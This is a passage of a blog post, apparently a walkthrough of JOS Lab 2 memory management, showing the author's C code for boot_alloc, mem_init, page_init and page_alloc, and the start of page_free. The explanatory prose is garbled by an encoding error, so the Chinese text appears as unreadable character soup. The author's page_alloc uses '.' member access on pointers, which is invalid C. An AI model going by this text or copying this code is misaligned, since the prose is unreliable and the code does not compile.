å°„ï¼Œæ•…ç›´æ¥å‡å»ä¸€ä¸ªå·®å€¼å³å¯ï¼Œåœ¨<code>kern/pmap.h</code> ä¸­ä¾¿å®ç°äº†è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€è½¬æ¢çš„å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* This macro takes a kernel virtual address -- an address that points above</span><br><span class="hljs-comment"> * KERNBASE, where the machine&#x27;s maximum 256MB of physical memory is mapped --</span><br><span class="hljs-comment"> * and returns the corresponding physical address.  It panics if you pass it a</span><br><span class="hljs-comment"> * non-kernel virtual address.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PADDR(kva) _paddr(__FILE__, __LINE__, kva)</span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">physaddr_t</span><br>_paddr(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">int</span> line, <span class="hljs-type">void</span> *kva)<br>&#123;<br><span class="hljs-keyword">if</span> ((<span class="hljs-type">uint32_t</span>)kva &lt; KERNBASE)<br>_panic(file, line, <span class="hljs-string">&quot;PADDR called with invalid kva %08lx&quot;</span>, kva);<br><span class="hljs-keyword">return</span> (<span class="hljs-type">physaddr_t</span>)kva - KERNBASE;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥å¼€å§‹è¡¥å®Œ Exercise 1 çš„å‡ ä¸ªå‡½æ•°çš„ä»£ç äº†</p><h4 id="boot-alloc-ï¼šç‰©ç†å†…å­˜çº¿æ€§åˆ†é…å™¨">boot_alloc()ï¼šç‰©ç†å†…å­˜çº¿æ€§åˆ†é…å™¨</h4><p>æŒ‰æƒ¯ä¾‹ï¼Œå…ˆçœ‹æ³¨é‡Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// This simple physical memory allocator is used only while JOS is setting</span><br><span class="hljs-comment">// up its virtual memory system.  page_alloc() is the real allocator.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If n&gt;0, allocates enough pages of contiguous physical memory to hold &#x27;n&#x27;</span><br><span class="hljs-comment">// bytes.  Doesn&#x27;t initialize the memory.  Returns a kernel virtual address.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If n==0, returns the address of the next free page without allocating</span><br><span class="hljs-comment">// anything.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If we&#x27;re out of memory, boot_alloc should panic.</span><br><span class="hljs-comment">// This function may ONLY be used during initialization,</span><br><span class="hljs-comment">// before the page_free_list list has been set up.</span><br></code></pre></td></tr></table></figure><ul><li><p>è¯¥å‡½æ•°ä¸ºä¸€ä¸ªç®€æ˜“çš„ physical memory allocatorï¼Œ<strong>åªåœ¨ JOS å»ºç«‹å…¶è™šæ‹Ÿå†…å­˜ç³»ç»Ÿæ—¶ä½¿ç”¨</strong>ï¼Œç®—æ˜¯å†…æ ¸åˆå§‹åŒ–è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªä¸´æ—¶å‡½æ•°</p></li><li><p>å…¶åŠŸèƒ½ä¸»è¦æ˜¯è¿”å›ä»¥é¡µä¸ºå•ä½çš„è¿ç»­çš„ç‰©ç†å†…å­˜ç©ºé—´çš„è™šæ‹Ÿåœ°å€çš„èµ·å§‹åœ°å€ï¼Œnä¸º0æ—¶è¿”å›ä¸‹ä¸€ä¸ªç©ºé—²é¡µé¢ï¼ŒOOMæ—¶ panic</p></li></ul><p>æŒæ¡äº†è¿™äº›ä¿¡æ¯å°±å¯ä»¥å¼€å§‹å†™äº†ï¼Œå‡½æ•°ä¸€å¼€å¤´å®šä¹‰äº†ä¸€ä¸ª static çš„å˜é‡ <code>nextfree</code>ï¼Œè¡¨ç¤ºå…¶åˆ†é…æ–¹å¼æ˜¯ä»å†…å­˜ä¸€å¼€å§‹çº¿æ€§å¾€ååˆ‡å‰²çš„ï¼Œç”±äºè¿™æ˜¯ä¸€ä¸ªè™šæ‹Ÿåœ°å€æ‰€ä»¥æˆ‘ä»¬åœ¨è®¡ç®—æ˜¯å¦ OOM æ—¶è¿˜éœ€è¦è½¬åŒ–æˆç‰©ç†åœ°å€ï¼Œå› ä¸ºé¢„è®¾é¡µè¡¨åªæ˜ å°„äº† 4MB å†…å­˜æ•…è¿™é‡Œè¶…å‡º 4MB æˆ‘ä»¬ç›´æ¥ OOM panicï¼›å¯¹é¡µå¤§å°çš„å¯¹é½ç›´æ¥ä½¿ç”¨ <code>ROUNDUP</code> å³å¯</p><blockquote><p>ROUNDUP æ˜¯ GCC çš„å®è¿˜æ˜¯ JOS çš„å®å‘¢ï¼Ÿæš‚ä¸”ä¸è€ƒè¯ï¼ˆå…¶å®æ˜¯æ²¡æ‰¾åˆ°ï¼‰ï¼Œè¿™é‡Œç›´æ¥â€œæ‹¿æ¥ä¸»ä¹‰â€</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">boot_alloc</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> n)</span><br>&#123;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *nextfree;<span class="hljs-comment">// virtual address of next byte of free memory</span><br><span class="hljs-type">char</span> *result;<br><br><span class="hljs-comment">// Initialize nextfree if this is the first time.</span><br><span class="hljs-comment">// &#x27;end&#x27; is a magic symbol automatically generated by the linker,</span><br><span class="hljs-comment">// which points to the end of the kernel&#x27;s bss segment:</span><br><span class="hljs-comment">// the first virtual address that the linker did *not* assign</span><br><span class="hljs-comment">// to any kernel code or global variables.</span><br><span class="hljs-keyword">if</span> (!nextfree) &#123;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> end[];<br>nextfree = ROUNDUP((<span class="hljs-type">char</span> *) end, PGSIZE);<br>&#125;<br><br><span class="hljs-comment">// Allocate a chunk large enough to hold &#x27;n&#x27; bytes, then update</span><br><span class="hljs-comment">// nextfree.  Make sure nextfree is kept aligned</span><br><span class="hljs-comment">// to a multiple of PGSIZE.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// LAB 2: Your code here.</span><br><br><span class="hljs-comment">// n == 0, return nextfree directly</span><br><span class="hljs-keyword">if</span> (!n)<br><span class="hljs-keyword">return</span> nextfree;<br><br><span class="hljs-comment">// fix up n to PGSIZE</span><br>n = ROUNDUP(n, PGSIZE);<br><br><span class="hljs-comment">// check if OOM, panic</span><br><span class="hljs-keyword">if</span> (PADDR(nextfree + n) &gt; <span class="hljs-number">0x00400000</span>)<br>panic(<span class="hljs-string">&quot;Out of Memory!&quot;</span>);<br><br><span class="hljs-comment">// normally return memory</span><br>result = nextfree;<br>nextfree += n;<br><br><span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="mem-init-ï¼šåˆå§‹åŒ–äºŒçº§é¡µè¡¨ï¼Œå»ºç«‹-freelistï¼ˆpart1ï¼‰">mem_init()ï¼šåˆå§‹åŒ–äºŒçº§é¡µè¡¨ï¼Œå»ºç«‹ freelistï¼ˆpart1ï¼‰</h4><p>æŒ‰é¡ºåºæ¥ä¸‹æ¥åˆ° <code>mem_init()</code> å‡½æ•°ï¼Œæƒ¯ä¾‹å…ˆçœ‹æ³¨é‡Šï¼Œä¸»è¦æ˜¯åˆå§‹åŒ–å†…æ ¸åœ°å€ç©ºé—´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Set up a two-level page table:</span><br><span class="hljs-comment">//    kern_pgdir is its linear (virtual) address of the root</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This function only sets up the kernel part of the address space</span><br><span class="hljs-comment">// (ie. addresses &gt;= UTOP).  The user part of the address space</span><br><span class="hljs-comment">// will be set up later.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// From UTOP to ULIM, the user is allowed to read but not write.</span><br><span class="hljs-comment">// Above ULIM the user cannot read or write.</span><br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯é€šè¿‡ <code>i386_detect_memory()</code> æ£€æµ‹å¯ç”¨å†…å­˜å®¹é‡ï¼Œä¹‹åç”¨ <code>boot_alloc()</code> åˆ†é…ä¸€å¼ é¡µé¢åšäºŒçº§é¡µè¡¨çš„ PGDï¼Œå¹¶<strong>å»ºç«‹è‡ªæˆ‘æ˜ å°„ï¼Œè®¾ç½®å¯¹åº”æƒé™</strong>ï¼Œä»¥æ­¤æˆ‘ä»¬ä¾¿èƒ½é€šè¿‡è™šæ‹Ÿåœ°å€è®¿é—®é¡µè¡¨äº†</p><blockquote><p>å‚è§  <code>memlayout.h</code> ä¸­çš„å†…å­˜å¸ƒå±€ï¼Œ<code>UVPT</code> æŒ‡å‘ PGD èµ·å§‹åœ°å€ï¼Œ<code>PDX()</code> åˆ™æ˜¯å°†è™šæ‹Ÿåœ°å€è½¬æ¢åˆ°é¡µç›®å½•è¡¨é¡¹ä¸‹æ ‡çš„å®ï¼Œ<code>PTE_U</code> è¡¨ç¤º ring0~ring3éƒ½èƒ½è®¿é—®ï¼Œ<code>PTE_P</code> è¡¨ç¤ºè¯¥é¡µé¢å­˜åœ¨</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">mem_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">uint32_t</span> cr0;<br><span class="hljs-type">size_t</span> n;<br><br><span class="hljs-comment">// Find out how much memory the machine has (npages &amp; npages_basemem).</span><br>i386_detect_memory();<br><br><span class="hljs-comment">// Remove this line when you&#x27;re ready to test this function.</span><br><span class="hljs-comment">//panic(&quot;mem_init: This function is not finished\n&quot;);</span><br><br><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// create initial page directory.</span><br>kern_pgdir = (<span class="hljs-type">pde_t</span> *) boot_alloc(PGSIZE);<br><span class="hljs-built_in">memset</span>(kern_pgdir, <span class="hljs-number">0</span>, PGSIZE);<br><br><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Recursively insert PD in itself as a page table, to form</span><br><span class="hljs-comment">// a virtual page table at virtual address UVPT.</span><br><span class="hljs-comment">// (For now, you don&#x27;t have understand the greater purpose of the</span><br><span class="hljs-comment">// following line.)</span><br><br><span class="hljs-comment">// Permissions: kernel R, user R</span><br>kern_pgdir[PDX(UVPT)] = PADDR(kern_pgdir) | PTE_U | PTE_P;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ°ç”±æˆ‘ä»¬è¡¥å…¨çš„éƒ¨åˆ†ï¼šåˆ†é… pages æ•°ç»„å¹¶åˆå§‹åŒ–ä¸º 0ï¼Œåå‡ ç§’å°±èƒ½å†™å®Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Allocate an array of npages &#x27;struct PageInfo&#x27;s and store it in &#x27;pages&#x27;.</span><br><span class="hljs-comment">// The kernel uses this array to keep track of physical pages: for</span><br><span class="hljs-comment">// each physical page, there is a corresponding struct PageInfo in this</span><br><span class="hljs-comment">// array.  &#x27;npages&#x27; is the number of physical pages in memory.  Use memset</span><br><span class="hljs-comment">// to initialize all fields of each struct PageInfo to 0.</span><br><span class="hljs-comment">// Your code goes here:</span><br>pages = (<span class="hljs-keyword">struct</span> PageInfo*) boot_alloc(npages * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> PageInfo));<br><span class="hljs-built_in">memset</span>(pages, <span class="hljs-number">0</span>, npages * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> PageInfo));<br></code></pre></td></tr></table></figure><p>ç»§ç»­é˜…è¯»ï¼Œæ¥ä¸‹æ¥ä¼šè°ƒç”¨ <code>page_init()</code> åˆå§‹åŒ– pages æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ª PageInfo ï¼Œä¸»è¦æ˜¯è®¾ç½®å¼•ç”¨è®¡æ•°ä¸º 0 å¹¶é“¾åˆ° freelist ä¸Šï¼Œä¹‹åæ˜¯ä¸‰ä¸ªæ£€æŸ¥å‡½æ•°ï¼ŒExercise 1 ä¸­æåˆ°æˆ‘ä»¬è¿™ä¸€æ­¥åªéœ€è¦è¡¥å…¨åˆ° <code>check_page_free_list()</code>ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥å¼€å§‹è¡¥å…¨ <code>page_init()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// Now that we&#x27;ve allocated the initial kernel data structures, we set</span><br><span class="hljs-comment">// up the list of free physical pages. Once we&#x27;ve done so, all further</span><br><span class="hljs-comment">// memory management will go through the page_* functions. In</span><br><span class="hljs-comment">// particular, we can now map memory using boot_map_region</span><br><span class="hljs-comment">// or page_insert</span><br>page_init();<br><br>check_page_free_list(<span class="hljs-number">1</span>);<br>check_page_alloc();<br>check_page();<br></code></pre></td></tr></table></figure><h4 id="page-init-ï¼šåˆå§‹åŒ–-pages-æ•°ç»„ä¸-freelist">page_init()ï¼šåˆå§‹åŒ– pages æ•°ç»„ä¸ freelist</h4><p>æƒ¯ä¾‹å…ˆçœ‹æ³¨é‡Šï¼šåˆå§‹åŒ– pages ç»“æ„ä½“ä¸ freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Initialize page structure and memory free list.</span><br><span class="hljs-comment">// After this is done, NEVER use boot_alloc again.  ONLY use the page</span><br><span class="hljs-comment">// allocator functions below to allocate and deallocate physical</span><br><span class="hljs-comment">// memory via the page_free_list.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æŒ‰æ³¨é‡Šè¿›è¡Œè¡¥å…¨ï¼Œæˆ‘ä»¬éœ€è¦æ˜ç¡®å“ªäº›é¡µåœ¨/ä¸åœ¨ç©ºé—²çŠ¶æ€ï¼š</p><ul><li>ç¬¬ä¸€å¼ ç‰©ç†å†…å­˜é¡µä¸ºåœ¨ä½¿ç”¨çŠ¶æ€ï¼Œä¿å­˜ç€å®æ¨¡å¼çš„ IDT ä¸ BIOS ç»“æ„</li><li><code>[PGSIZE, npages_basemem * PGSIZE)</code> ä¸ºå¯ç”¨çš„ç©ºé—²å†…å­˜</li><li><code>[IOPHYSMEM, EXTPHYSMEM)</code> è¿™ä¸€å—å†…å­˜ç”¨ä½œ IOï¼Œå¯¹æˆ‘ä»¬æ¥è¯´æ˜¯ä¸€ä¸ªâ€œå†…å­˜ç©ºæ´â€ï¼Œä¹Ÿä¸åº”å½“è¢«ä½¿ç”¨</li><li><code>[EXTPHYSMEM, ...)</code> è¿™ä¸€å—æ‰©å±•å†…å­˜ï¼Œæœ‰çš„æ˜¯åœ¨ä½¿ç”¨ç€çš„ï¼Œæœ‰çš„åˆæ˜¯ç©ºé—²çš„ï¼Œæˆ‘ä»¬éœ€è¦ç»•å¼€ï¼š<ul><li>å†…æ ¸é•œåƒ</li><li>é¡µè¡¨</li><li>å…¶ä»–æ•°æ®ç»“æ„</li></ul></li></ul><p>æœ€åä¸€ä¸ªä¼¼ä¹æ¯”è¾ƒæ£˜æ‰‹ï¼Œä½†æˆ‘ä»¬çŸ¥é“ boot_alloc() åˆå§‹åŒ– nextfree æ—¶ç”¨åˆ°ä¸€ä¸ªå˜é‡ end æŒ‡å‘å†…æ ¸ bss æ®µæœ«å°¾ï¼Œè¯´æ˜<strong>å¾€åçš„éƒ½æ˜¯å¯ç”¨çš„å†…å­˜</strong>ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦å°†ç¬¬ä¸‰é¡¹å¾€åä¸€ç›´åˆ° nextfree çš„å†…å­˜é¡µè®¾ä¸ºä½¿ç”¨çŠ¶æ€ã€nextfree å¾€åçš„å†…å­˜è®¾ä¸ºç©ºé—²é¡µé“¾å…¥ freelist å³å¯</p><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„ä¸€ä¸ªç‚¹ï¼š<code>boot_alloc()</code> åˆ†é…çš„æ˜¯è™šæ‹Ÿå†…å­˜ï¼Œ<strong>ä½†æ˜¯ pages æ•°ç»„å¯¹åº”çš„æ˜¯ç‰©ç†å†…å­˜</strong>ï¼Œå› æ­¤è¿™é‡Œåˆ«å¿˜äº†è¿›è¡Œè½¬æ¢ï¼ˆç¬”è€…å°±åœ¨è¿™ç¢°äº†å‘ï¼‰</p><p>æ³¨æ„ä»¥ä¸Šè¿™äº›æ ‡å‡†ä¹‹åï¼Œä¿®æ”¹ <code>page_init()</code> çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">page_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// The example code here marks all physical pages as free.</span><br><span class="hljs-comment">// However this is not truly the case.  What memory is free?</span><br><span class="hljs-comment">//  1) Mark physical page 0 as in use.</span><br><span class="hljs-comment">//     This way we preserve the real-mode IDT and BIOS structures</span><br><span class="hljs-comment">//     in case we ever need them.  (Currently we don&#x27;t, but...)</span><br><span class="hljs-comment">//  2) The rest of base memory, [PGSIZE, npages_basemem * PGSIZE)</span><br><span class="hljs-comment">//     is free.</span><br><span class="hljs-comment">//  3) Then comes the IO hole [IOPHYSMEM, EXTPHYSMEM), which must</span><br><span class="hljs-comment">//     never be allocated.</span><br><span class="hljs-comment">//  4) Then extended memory [EXTPHYSMEM, ...).</span><br><span class="hljs-comment">//     Some of it is in use, some is free. Where is the kernel</span><br><span class="hljs-comment">//     in physical memory?  Which pages are already in use for</span><br><span class="hljs-comment">//     page tables and other data structures?</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Change the code to reflect this.</span><br><span class="hljs-comment">// NB: DO NOT actually touch the physical memory corresponding to</span><br><span class="hljs-comment">// free pages!</span><br><br><span class="hljs-comment">// 0) init</span><br><span class="hljs-type">size_t</span> i;<br><span class="hljs-type">size_t</span> next_free_addr;<br>page_free_list = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// 1) real-mode IDT and BIOS</span><br>pages[<span class="hljs-number">0</span>].pp_ref = <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">// 2) [PGSIZE, npages_basemem * PGSIZE), all free</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; npages_basemem; i++) &#123;<br>pages[i].pp_ref = <span class="hljs-number">0</span>;<br>pages[i].pp_link = page_free_list;<br>page_free_list = &amp;pages[i];<br>&#125;<br><br><span class="hljs-comment">// 3) [IOPHYSMEM, EXTPHYSMEM), treat it as a hole</span><br><span class="hljs-keyword">for</span> (i = IOPHYSMEM/PGSIZE; i &lt; EXTPHYSMEM/PGSIZE; i++) &#123;<br>pages[i].pp_ref = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 4) kernel image, page tables, other structure in user, others free</span><br>next_free_addr = (<span class="hljs-type">size_t</span>) PADDR(boot_alloc(<span class="hljs-number">0</span>));<br><span class="hljs-keyword">for</span> (i = EXTPHYSMEM/PGSIZE; i &lt; next_free_addr / PGSIZE; i++) &#123;<br>pages[i].pp_ref = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">for</span> (i = next_free_addr / PGSIZE; i &lt; npages; i++) &#123;<br>pages[i].pp_ref = <span class="hljs-number">0</span>;<br>pages[i].pp_link = page_free_list;<br>page_free_list = &amp;pages[i];<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="page-alloc-ï¼šåˆ†é…å•ä¸ªç©ºé—²é¡µé¢">page_alloc()ï¼šåˆ†é…å•ä¸ªç©ºé—²é¡µé¢</h4><p>è¿™ä¸€å—æ¯”è¾ƒç®€å•ï¼Œç›´æ¥ä» freelist ä¸­å–å‡ºä¸€ä¸ªé¡µé¢å³å¯ï¼Œè¿™é‡Œæ³¨æ„å¦‚æœæœ‰ <code>ALLOC_ZERO</code> åˆ™éœ€è¦æˆ‘ä»¬å¸®å¿™æ¸…é›¶ï¼Œ<strong>è€Œä¸”æˆ‘ä»¬åˆ†é…æ—¶ä¸åº”å½“å¢åŠ å¼•ç”¨è®¡æ•°ï¼Œè¿™åº”è¯¥æ˜¯ç”± caller å®Œæˆçš„</strong></p><p>è¿™é‡Œæˆ‘ä»¬åˆ«å¿˜äº†åœ¨æ¸…é›¶æ—¶åº”å½“ç”¨ <code>page2kva</code> å°† PageInfo ç»“æ„ä½“åœ°å€è½¬åŒ–ä¸ºå…¶å¯¹åº”é¡µé¢çš„è™šæ‹Ÿåœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Allocates a physical page.  If (alloc_flags &amp; ALLOC_ZERO), fills the entire</span><br><span class="hljs-comment">// returned physical page with &#x27;\0&#x27; bytes.  Does NOT increment the reference</span><br><span class="hljs-comment">// count of the page - the caller must do these if necessary (either explicitly</span><br><span class="hljs-comment">// or via page_insert).</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Be sure to set the pp_link field of the allocated page to NULL so</span><br><span class="hljs-comment">// page_free can check for double-free bugs.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Returns NULL if out of free memory.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: use page2kva and memset</span><br><span class="hljs-keyword">struct</span> PageInfo *<br><span class="hljs-title function_">page_alloc</span><span class="hljs-params">(<span class="hljs-type">int</span> alloc_flags)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">victim</span>;</span><br><br><span class="hljs-comment">// out of memory</span><br><span class="hljs-keyword">if</span> (!page_free_list)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// normal alloc</span><br>victim = page_free_list;<br>page_free_list = page_free_list.pp_link;<br>victim.pp_link = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_ZERO)<br><span class="hljs-built_in">memset</span>(page2kva(victim), <span class="hljs-number">0</span>, PGSIZE);<br><br><span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="page-free-ï¼šé‡Šæ”¾å•ä¸ªé¡µé¢">page_free()ï¼šé‡Šæ”¾å•ä¸ªé¡µé¢</h4><p>ä¸»è¦æ˜¯ä¸€äº›æ£€æŸ¥ä¹‹åæ’å…¥ freelist å¤´éƒ¨å³å¯ï¼Œç¬”è€…è¿˜è‡ªè¡ŒåŠ äº†ä¸€ä¸ªç±»ä¼¼ ptmalloc ä¸­å¯¹å¤´éƒ¨çš„ç®€æ˜“ double free æ£€æµ‹ï¼ˆç¬‘ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Return a page to the free list.</span><br><span class="hljs-comment">// (This function should only be called when pp-&gt;pp_ref reaches 0.)</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">page_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> PageInfo *pp)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><span class="hljs-comment">// Hint: You may want to panic if pp-&gt;pp_ref is nonzero or</span><br><span class="hljs-comment">// pp-&gt;pp_link is not NULL.</span><br><br><span class="hljs-comment">// check for double free at top</span><br><span class="hljs-keyword">if</span> (pp == page_free_list)<br>panic(<span class="hljs-string">&quot;double free detected (freelist top)&quot;</span>);<br><br><span class="hljs-comment">// check double free by pp_link</span><br><span class="hljs-keyword">if</span> 